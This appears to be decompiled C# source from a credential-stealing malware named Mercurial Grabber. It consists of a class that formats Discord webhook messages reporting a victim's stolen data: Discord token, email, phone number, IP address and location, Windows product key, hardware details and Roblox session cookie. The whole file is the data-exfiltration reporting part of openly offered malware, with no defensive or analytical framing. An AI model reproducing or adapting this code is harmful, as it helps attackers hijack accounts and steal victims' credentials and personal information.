using System;

namespace Stealer
{
	// Token: 0x02000017 RID: 23
	public static class WebhookContent
	{
		// Token: 0x06000060 RID: 96 RVA: 0x000051A4 File Offset: 0x000033A4
		public static string Token(string email, string phone, string token, string username, string avatar, string locale, string creation, string id)
		{
			return string.Concat(new string[]
			{
				"{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**Account Info**\",\"value\":\"User ID: ",
				id,
				"\\nEmail: ",
				email,
				"\\nPhone Number: ",
				phone,
				"\\nLocale: ",
				locale,
				"\",\"inline\":true},{\"name\":\"**Token**\",\"value\":\"`",
				token,
				"`\\nAccount Created: (`",
				creation,
				"`)\",\"inline\":false}],\"author\":{\"name\":\"",
				username,
				"\",\"icon_url\":\"",
				avatar,
				"\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}"
			});
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00005234 File Offset: 0x00003434
		public static string IP(string ip, string country, string countryIcon, string regionName, string city, string zip, string isp)
		{
			return string.Concat(new string[]
			{
				"{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**IP Address Info**\",\"value\":\"IP Address - ",
				ip,
				"\\nISP - ",
				isp,
				"\\nCountry - ",
				country,
				"\\nRegion - ",
				regionName,
				"\\nCity - ",
				city,
				"\\nZip - ",
				zip,
				"\",\"inline\":true}],\"thumbnail\":{\"url\":\"",
				countryIcon,
				"\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}"
			});
		}

		// Token: 0x06000062 RID: 98 RVA: 0x000052B4 File Offset: 0x000034B4
		public static string ProductKey(string key)
		{
			return "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**Windows Product Key**\",\"value\":\"Product Key - " + key + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}";
		}

		// Token: 0x06000063 RID: 99 RVA: 0x000052C8 File Offset: 0x000034C8
		public static string Hardware(string osName, string osArchitecture, string osVersion, string processName, string gpuVideo, string gpuVersion, string diskDetails, string pcMemory)
		{
			return string.Concat(new string[]
			{
				"{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**OS Info**\",\"value\":\"Operating System Name - ",
				osName,
				"\\nOperating System Architecture - ",
				osArchitecture,
				"\\nVersion - ",
				osVersion,
				"\",\"inline\":true},{\"name\":\"**Processor**\",\"value\":\"CPU - ",
				processName,
				"\",\"inline\":false},{\"name\":\"**GPU**\",\"value\":\"Video Processor - ",
				gpuVideo,
				"\\nDriver Version  - ",
				gpuVersion,
				"\",\"inline\":false},{\"name\":\"**Memory**\",\"value\":\"Memory - ",
				pcMemory,
				"\",\"inline\":false},{\"name\":\"**Disk**\",\"value\":\"",
				diskDetails,
				"\",\"inline\":false}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}"
			});
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00005357 File Offset: 0x00003557
		public static string RobloxCookie(string cookie)
		{
			return "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**Roblox Cookie**\",\"value\":\"" + cookie + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}";
		}

		// Token: 0x06000065 RID: 101 RVA: 0x0000536C File Offset: 0x0000356C
		public static string SimpleMessage(string title, string message)
		{
			return string.Concat(new string[]
			{
				"{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**",
				title,
				"**\",\"value\":\"",
				message,
				"\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"}"
			});
		}
	}
}
